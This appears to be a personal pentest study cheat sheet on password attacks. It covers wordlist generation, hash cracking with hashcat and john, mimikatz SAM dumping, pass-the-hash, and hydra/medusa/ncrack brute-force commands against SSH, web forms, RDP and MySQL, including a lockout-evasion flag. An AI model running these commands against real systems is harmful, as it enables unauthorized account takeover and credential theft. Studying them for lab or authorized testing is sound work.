# wordlists

```
kali  /usr/share/wordlists

//https://github.com/danielmiessler/SecLists
apt install seclists
```

## wordlist 合并

```
cat wordlist.txt >> wordlist2.txt
```
## 生成wordlist

### from html
```
curl http://example.com > htmlpwd.txt
html2dic htmlpwd.txt
```

### cewl 爬取网页生成字典
```
cewl [options] <url>
-w 输出文件
-m 最小密码长度
-d <x> 爬取深度，default2
-c 输出count
-e  包含email 地址

cewl -w htmlpwd.txt https://example.com
#-m指定密码长度
cewl -w htmlpwd.txt -m 6 https://example.com

// -m 6 6位，-w write to file
cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
```

### 字典优化
使用john rules 优化字典
规则参考：https://www.openwall.com/john/doc/RULES.shtml
```
#--rules 使用规则对字典进行处理
john ---wordlist=wordlist.txt --rules --stdout > wordlist-modified.txt

// john 生成配置规则
sudo vim /etc/john/john.conf
#add two numbers to the end of each passwd
$[0-9]$[0-9]

john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt
//list文件密码，每一个都增加2位数字
```

### crunch 生成密码
密码字典生成工具，按照指定规则生成字典。
https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-4-creating-custom-wordlist-with-crunch-0156817/
```
Usage: crunch <min> <max> [options]
常用参数：
min max，密码位数
     -b     指定文件输出的大小，避免字典文件过大  
     -c     指定文件输出的行数，即包含密码的个数
     -d     限制相同元素出现的次数
     -e     定义停止字符，即到该字符串就停止生成
     -f     调用库文件（/etc/share/crunch/charset.lst）
     -i     改变输出格式，即aaa,aab -> aaa,baa
     -I     通常与-t联合使用，表明该字符为实义字符
     -m     通常与-p搭配
     -o     将密码保存到指定文件
     -p     指定元素以组合的方式进行
     -q     读取密码文件，即读取pass.txt
     -r     定义重某一字符串重新开始
     -s     指定一个开始的字符，即从自己定义的密码xxxx开始
     -t     指定密码输出的格式
     -u     禁止打印百分比（必须为最后一个选项）
     -z     压缩生成的字典文件，支持gzip,bzip2,lzma,7z  
     %      代表数字
     ^      代表特殊符号
     @      代表小写字母
     ,      代表大写字符   
练习示例：
#生成6-8位包含数字的密码
crunch 6 8 1234567890 -o wordlist.txt
// 指定字符生成10位密码输出到文件
crunch 10 10 aefhrt -o pwd.txt  
// 包含空格，双引号包围字符
crunch 3 3 "ab ;.,"
// 生成多个元素组合
crunch 4 4 -p 123 abc 2020 ...
// 生成指定的字符串，201800后接4个数字
crunch 10 10 -t 201800%%%%
// 指定前缀为特定字符串，后面为指定的字符
crunch 3 3 -t d%@ -p aaa bbb // 前缀为aaa或bbb，后接1数字1小写字母
// -l 参数使 特殊字符原样输出  @,%^
crunch 3 3 -t 1@@ -l a@a

#使用/usr/share/rainbowcrack/charset.txt 字符集生成密码
#生成8位密码，仅包含大小写字母，mixalpha 字符集
crunch 8 8 -f /usr/share/rainbowcrack/charset.txt  mixalpha -o 8pwd.lst

//Aaa!!001, 大写字母，2写，2特殊字符，3数字
crunch 8 8 -t ,@@^^%%%
Aaa!!000
Aaa!!001
Aaa!!002
Aaa!!003
Aaa!!004

//指定字符生成密码，4-6位，包含数字及ABCDEF
crunch 4 6 0123456789ABCDEF -o crunch.txt

//charset 生成密码 
crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt
```
### 生成日期
htb-intelligence, 生成日期格式文件名

```python
from datetime import timedelta, date

def daterange(date1, date2):
    for n in range(int ((date2 - date1).days)+1):
        yield date1 + timedelta(n)

start_dt = date(2020, 1, 1)
end_dt = date(2020, 12, 31)
for dt in daterange(start_dt, end_dt):
    print(dt.strftime("%Y-%m-%d-upload.pdf"))
```

```sh
export YEAR=2020
echo $YEAR-{01..12}-{01..31}-upload.pdf | tr ' ' '\n' > $YEAR.txt
```

### namemash 
+ 根据姓名生成用户名
+ https://gist.github.com/superkojiman/11076951


## Awesome wordlist

### secklist

[Seclist](https://github.com/danielmiessler/SecLists), github地址
kali tool description
https://tools.kali.org/password-attacks/seclists

```
apt -y install seclists
```

### PayloadAllTheThings
[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings),web安全相关payloads，Methodology and Resources 包含linux、windows提权相关内容。

目录结构
```
README.md - vulnerability description and how to exploit it, including several payloads
Intruder - a set of files to give to Burp Intruder
Images - pictures for the README.md
Files - some files referenced in the README.md
```

# Hash cracking

## identify hash
一般识别hash的特征参考
* hash长度
* 字符集
* 特殊字符
参考：https://null-byte.wonderhowto.com/how-to/use-hash-identifier-determine-hash-types-for-password-cracking-0200447/
kali上可只是使用hash-indentifier，其他可git克隆本地使用hash-id.py(python3)

```
hash-identifier

#git
git clone https://github.com/blackploit/hash-identifier.git
cd ./hash-identifier
python3 hashid.py

hashid c43ee559d69bc7f691fe2fbfe8a5ef0a

# mdxfind, determine how these password hashes were created
## pg monster
wget https://www.techsolvency.com/pub/bin/mdxfind/mdxfind.static -O mdxfind
chmod +x mdxfind
echo 'your_salt' > salt.txt
echo 'password' > pass.txt
# -h, hash type
# -s, salt
# -i, iterators
## check the hash method
echo "a2b4e80cd640aaa6e417febe095dcbfc" | ./mdxfind -h 'MD5' -s salt.txt pass.txt -i 5
## crack clear-text pass
echo "844ffc2c7150b93c4133a6ff2e1a2dba" | ./mdxfind -h 'MD5PASSSALT' -s salt.txt
```
其他线上识别地址
http://www.onlinehashcrack.com/hash-identification.php
https://md5hashing.net/hash_type_checker

## Reuse hash

## hash crack
* sample password hash strings 
https://openwall.info/wiki/john/sample-hashes

### hashcat
+ hashcat rules, [OneRuleToRuleThemAll](https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule)
+ hashcat [example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
+ 参考 [freebuf](https://www.freebuf.com/sectool/164507.html)

```
hashcat --help
# 常用参数
## -m MODE_NUMBER  //制定hash mode
## -a  attack_mod // 0 straight， 1 combination
## -o  found.txt  //输出文件

## 5600 NetNTLMv2, hash from smbserver/responder catch.
## 18200, kerberos 5, etype 23, AS-REP
## 13100, Kerberos 5, etype 23, TGS-REP
## 0, md5
## 1000，NTLM	b4b9b02e6f09a9bd760f388b67351e2b
## 2100, mscachev2, $DCC2$10240#username#hash

hashcat -m MODE_NUMBER -a 0 HASH_VALUE pwdguess.txt

hashcat -b //查看算力，GPU

## search hash type
hashcat -example-hashes | grep krb5

hashcat -a 0 -m 5600 peterj.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule
```

**hashcat on mac**
install with brew, run with the error `clBuildProgram(): CL_BUILD_PROGRAM_FAILURE`
+ way 1, from git issue [3080](https://github.com/hashcat/hashcat/issues/3080)
go to the hashcat dir `/usr/local/share/hashcat/OpenCL`, then run hashcat.

```bash
clBuildProgram(): CL_BUILD_PROGRAM_FAILURE

<program source>:7:10: fatal error: 'inc_vendor.h' file not found
#include "inc_vendor.h"
         ^

* Device #1: Kernel /usr/local/Cellar/hashcat/6.2.5/share/hashcat/OpenCL/shared.cl build failed.
```

+ way 2, git clone and make git issue [3080](https://github.com/hashcat/hashcat/issues/3080)
have not verified.
git clone to ${home} dir, and make 





### john the ripper

```
//直接破解
sudo john hash.txt --format=NT
////指定wordlist，指定--rules
john --wordlist=wordlist.txt dump.txt
john --rules --wordlist=wordlist.txt dump.txt
```

### linux shadow password

```
unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
john --rules --wordlist=wordlist.txt unshadowed.txt
```

### crack site
+ Crackstation https://crackstation.net/
+ Hashkiller https://hashkiller.co.uk/
+ Google hashes Search pastebin.
+ cyberchef, decrypt and decode; check htb multimaster/cascade; [cyberchef](https://gchq.github.io/CyberChef/)

## windows hash
system registry 、SAM registry  位置

```
Systemroot can be windows
%SYSTEMROOT%\repair\SAM
windows\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM

System file can be found here
SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\RegBack\system

pwdump system sam
```
mimikatz dump hash  p588
```
mimikatz dump hash

//enables the SeDebugPrivilge access right required to tamper with another process
mimikatz # privilege::debug
Privilege '20' OK

//elevate the security token from high integrity (administrator) to SYSTEM integrity
mimikatz # token::elevate    //
Token Id : 0
User name :
SID name : NT AUTHORITY\SYSTEM

//dump content of SAM database
mimikatz # lsadump::sam

RID : 000003e9 (1001)
User : Offsec
Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
```

## pass the hash- reusing hashes
参考
https://www.kali.org/penetration-testing/passing-hash-remote-desktop/
```
#smb
export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
pth-winexe -U administrator //192.168.1.101 cmd

pth-winexe -U admin/hash:has //192.168.0.101 cmd

#Remote Desktop
apt-get update
apt-get install freerdp-x11
xfreerdp /u:admin /d:win7 /pth:hash:hash /v:192.168.1.101

#-passing hash
pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```

# Online service cracking 

## SSH cracking
```
# ssh to john, 私钥转为john格式，破解phase密码
root@kali:~# locate ssh2john
/usr/share/john/ssh2john.py
root@kali:~# /usr/share/john/ssh2john.py id_rsa > orestis.hash
root@kali:~# john orestis.hash --wordlist=/usr/share/wordlists/rockyou.txt

hydra -l root -P wordlist.txt 192.168.0.101 ssh
hydra -L userlist.txt -P best1050.txt 192.168.1.103 -s 22 ssh -V

hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
```

## web
参考
https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-web-form-passwords-with-thc-hydra-burp-suite-0160643/

* medusa

```
medusa -h 192.168.1.10 -u admin -P wordlist.txt -M http -m DIR:/test -T 10

medusa -d //show network protocol
```
* hydra

```
// post
hydra http-form-post -U //additional info
hydra -L <username list> -p <password list> <IP Address> <form parameters><failed login message>
hydra -L <wordlist> -P<password list> 192.168.1.10 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"

#使用成功提示爆破
hydra -l admin -P /usr/share/dirb/wordlists/small.txt 192.168.1.10 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&S=success message" -V

#-w指定间隔时间，绕过账号锁定
hydra -l admin -P /usr/share/dirb/wordlists/small.txt 192.168.1.10 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -w 10 -V

hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
```

## port 161 SNMP
```
hydra -P wordlist.txt -v 102.168.0.101 snmp
```
## 3389-RDP
```
ncrack -vv --user admin -P password-file.txt rdp://192.168.0.101

sudo apt install crowbar
//specify the protocol (-b), the target server (-s), a username (-u), //a wordlist (-C), and the number of threads (-n)
crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
```
## mysql crack

```
medusa  -h 192.168.1.106 –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mysql

ncrack –v –U /root/Desktop/user.txt–P /root/Desktop/pass.txt 192.168.1.106:3306

hydra –L /root/Desktop/user.txt –P /root/Desktop/pass.txt 192.168.1.106 mysql

msf > use auxiliary/scanner/mysql/mysql_login
msf auxiliary(mysql_login) > set rhosts 192.168.1.106
msf auxiliary(mysql_login) > set user_file /root/Desktop/users.txt
msf auxiliary(mysql_login) > set pass_file /root/Desktop/password.txt
msf auxiliary(mysql_login) > set stop_on_success true
msf auxiliary(mysql_login) > run
```

# File crack

## pdf file

```bash
perl /usr/share/john/pdf2john.pl infrastructure.pdf| tee pdf_hash

john pdf_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

## rar file
rar file with password protected.

```bash
rar2john MSSQL_BAK.rar > rar_hash
john rar_hash --wordlist=/usr/share/wordlists/rockyou.txt

# e, extract
# -p, password; pwd： letmeinplease
unrar e MSSQL_BAK.rar -pletmeinplease
```


# Tools

## hydra 
参考
https://www.jianshu.com/p/4da49f179cee
https://www.pianshen.com/article/5945421352/
* 参数说明

```bash
hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]
#常用参数说明
-R  //继续从上一次进度接着**
-S //大写，采用SSL链接
-s <PORT>  //小写，可通过这个参数指定非默认端口
-l<LOGIN>  //指定**的用户，对特定用户**
-L<FILE>   //指定用户名字典
-p<PASS> //小写，指定密码**，少用，一般是采用密码字典
-P<FILE> //大写，指定密码字典
-e<ns> //可选选项，n：空密码试探，s：使用指定用户和密码试探， r：reversed login
-C<FILE> //使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数
-M<FILE> //指定目标列表文件一行一条
-o<FILE> //指定结果输出文件
-f //在使用-M参数以后，找到第一对登录名或者密码的时候中止**
-t<TASKS>  //加密的线程调小，同时运行的线程数，默认为16
-w<TIME>  //设置最大超时的时间，单位秒，默认是30s
-v /-V //显示详细过程
service  //指定服务类型
telnet ftp pop3[-ntlm]imap[-ntlm] smb smbnt 
http[s]-{head|get} http-{get|post}-form http-proxy 
ciscocisco-enable vnc ldap2 ldap3 
mssql mysql oracle-listener postgres 
nntp socks5rexec rlogin pcnfs snmp rsh cvs svn 
icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhereteamspeak sip vmauthd firebird ncp afp
```
* 常用

```
#ssh
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh
hydra -l 用户名 -p 密码字典 -t 线程 -o /1 -vV ip ssh

#ftp
hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) –vV
hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV

#web http header
hydra -L /usr/share/wordlists/metasploit/http_default_users.txt -P /usr/share/wordlists/metasploit/http_default_pass.txt -e ns -f -s 12345 192.168.3.173 http-head

#web get
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get/admin/
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get/admin/index.PHP

#web post
hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form "/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorrypassword"
hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form "login.php:id=^USER^&passwd=^PASS^:<title>wrong username orpassword</title>"

#web https
hydra -m /index.php -l admin -P pass.txt 10.36.16.18 https

#http proxy
hydra -l admin -P pass.txt http-proxy://10.36.16.18

#smb
hydra -l administrator -P pass.txt 10.36.16.18 smb

 telnet
hydra ip telnet  -L 用户 -P 密码 -e ns -f -v -t 10000000000000000000

#imap
hydra -L user.txt -p secret 10.36.16.18 imap PLAIN
hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN

#pop3
hydra -l admin -P pass.txt my.pop3.mail pop3

#cisco
hydra -P pass.txt 10.36.16.18 cisco
hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable

#tealmspeak
hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak

```

## ncrack
开源工具，网络认证协议破解。
可快速可导的审核大型网络的默认密码、弱密码，可对单个服务进行暴力破解。
常用参数及示例

```
Usage: ncrack [Options] {target and service specification}
-U file // 用户名文件
-P file //密码文件
--user userlist // 逗号分割的user list
--pass pwdlist // 逗号分割的 pwd list
--pairwise // Choose usernames and passwords in pairs
example:
  ncrack -v --user root localhost:22
  ncrack -v -T5 https://192.168.0.1
  ncrack -v -iX ~/nmap.xml -g CL=5,to=1h
练习示例：
ncrack -v http://192.168.3.173:12345
```

## john the ripper
John the Ripper password cracker，密码破解工具。多用于unix弱密码检测，支持windows LM哈希。
http://www.openwall.com/john/
```
Usage: john [OPTIONS] [PASSWORD-FILES]
--format=NAME //密文格式，DES/BSDI/MD5/BF/AFS/LM
--wordlist=FILE //字典模式，从file或stdin读取字典


练习示例：
// 破解linux 登录密码，pwd.txt 为/etc/passwd中密文 $1$flag$vqjCxzjtRc7PofLYS2lWf/
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt pwd.txt
john --show pwd.txt
```

# Cipher

## password convert
+ password in file(dll,exe)
+ xxd reverse hex to string 
+ strings -e l, password in file.

```bash
# hex to string
echo -n 6d2424716c5f53405f504073735730726421 | xxd -ps -r
```

## Cipher identifier
+ site：https://www.boxentriq.com/code-breaking/cipher-identifier
+ detect and decode encoding things, [decode.fr](https://www.dcode.fr/identification-chiffrement)
+ common encoding, brainfuck, OoK!, 

### Vigenere Cipher
[read more on wiki](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher)
[htb-brainfuc](https://p0i5on8.github.io/posts/hackthebox-brainfuck/#vigenere-cipher)

**decipher**
online: https://www.boxentriq.com/code-breaking/vigenere-cipher
git: https://github.com/4st1nus/Vigenere-Cipher-Key-Finder
```
#!/bin/python

print ("Vigenere Decipher\n")
print ("Text must be entered without Symbols or Space\n")

plain = raw_input("Enter Known Text: ")
encrypted = raw_input("Enter the corresponding Encrypted text to the known text: ")
password = ""

for i in range(len(plain)):
    x = ((ord(encrypted[i]) - ord(plain[i])) % 26) + 97
    char = chr(x)
    password = password + char

print password
```
### brain编码
+ [brain编码](http://ctf.ssleye.com/brain.html)
